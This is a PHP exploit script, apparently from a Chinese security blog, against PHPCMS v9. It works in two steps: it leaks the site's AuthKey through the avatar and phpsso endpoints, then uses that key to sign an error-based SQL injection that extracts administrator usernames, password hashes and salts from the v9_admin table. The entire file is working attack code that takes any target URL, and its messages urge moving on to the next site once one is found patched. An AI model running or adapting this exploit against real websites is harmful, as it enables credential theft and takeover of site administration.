<?php
/**
 * Created by 独自等待
 * Date: 2015/7/17
 * Time: 21:23
 * Name: phpcmsv9_authkey_exp.php
 * 独自等待博客：http://www.waitalone.cn/
 */
print_r('
+-------------------------------------------------------------+
               PHPCMS_V9 AuthKey泄露导致注入EXP
               Site：http://www.waitalone.cn/
                  Exploit BY： 独自等待
                    Time：2015-07-17
+-------------------------------------------------------------+
');
if ($argc < 2) {
    print_r('
+-------------------------------------------------------------+
Useage: php ' . $argv[0] . ' phpcmsv9_website
Example: php ' . $argv[0] . ' http://www.waitalone.cn/
+-------------------------------------------------------------+
    ');
    exit;
}
error_reporting(0);

//统计时间
$start_time = func_time();
$phpcmsv9 = $argv[1];
if (substr($phpcmsv9, -1) != '/') $phpcmsv9 .= '/';
//请先添加cookie
$cookie = 'PHPSESSID=opphk3ors2sf2m1bqg148fmue5';

//核心代码,注入获取管理员账号及密码
$sql_admin = sql_inject();
$count = count($sql_admin);
if ($count != 0) {
    echo '恭喜大爷,成功获取到[ ' . $count . ' ]个管理员账号!' . "\n\n";
    foreach ($sql_admin as $num => $admin) {
        echo '管理员' . ($num + 1) . ' => ' . $admin . PHP_EOL;
    }
} else {
    exit('杯具了大爷,此站漏洞已经修补,请秒下一个!');
}
//发送数据包函数
function get_data($target)
{
    //控制http发包参数
    global $cookie;
    $opts = array(
        'http' => array(
            'method' => "GET",
            'timeout' => 30,
            'header' => "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0\r\n" .
                "Cookie: $cookie\r\n"
        )
    );
    $context = stream_context_create($opts);
    $content = file_get_contents($target, false, $context);
    return $content;
}

//获取authkey函数
function authkey()
{
    $authkey = '';
    global $phpcmsv9;
    $avatar_url = $phpcmsv9 . 'index.php?m=member&c=index&a=account_manage_avatar&t=1';
    $upurl = get_data($avatar_url);
    if (preg_match('/\'upurl\':"(.+?)&callback=return_avatar/', $upurl, $match)) {
        $key_url = base64_decode($match[1]);
        $key_url = str_replace('uploadavatar', 'getapplist', $key_url);
        $auth_url = get_data($key_url);
        if (preg_match('/"authkey";s:32:"(.*?)"/', $auth_url, $au_match)) {
            echo '成功获取到AuthKey：' . $au_match[1] . "\n\n";
            $authkey = $au_match[1];
        }
    }
    return $authkey;
}

//SQL注入函数
function sql_inject()
{
    global $phpcmsv9;
    $limit = 10; //默认显示多少个管理员账号
    $admin = array();
    $key = authkey();
    for ($i = 0; $i < $limit; $i++) {
        $code = sys_auth("action=synlogin&uid=1' and(select 1 from(select count(*),concat((select (select (
        SELECT distinct concat(0x7e,username,0x3a,password,0x3a,encrypt,0x7e)FROM v9_admin limit $i,1)) from
        information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#", 'ENCODE', $key);
        $target = $phpcmsv9 . '/api.php?op=phpsso&code=' . $code;
        #$target = $phpcmsv9 . 'phpsso_server/?m=phpsso&c=index&a=getuserinfo&appid=1&data=' . $code;
        $content = get_data($target);
        if (preg_match('/~(.+?)~1/', $content, $match)) {
            $admin[] = $match[1];
        } else {
            break;
        }
    }
    return $admin;
}

//phpcms authkey加密函数
function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0)
{
    $key_length = 4;
    $key = md5($key);
    $fixedkey = hash('md5', $key);
    $egiskeys = md5(substr($fixedkey, 16, 16));
    $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(hash('md5', microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
    $keys = hash('md5', substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
    $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $egiskeys), 0, 16) . $string : base64_decode(substr($string, $key_length));
    $i = 0;
    $result = '';
    $string_length = strlen($string);
    for ($i = 0; $i < $string_length; $i++) {
        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
    }
    if ($operation == 'ENCODE') {
        return $runtokey . str_replace('=', '', base64_encode($result));
    } else {
        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $egiskeys), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    }
}

//时间统计函数
function func_time()
{
    list($microsec, $sec) = explode(' ', microtime());
    return $microsec + $sec;
}

echo "\n脚本执行时间：" . round((func_time() - $start_time), 4) . '秒';
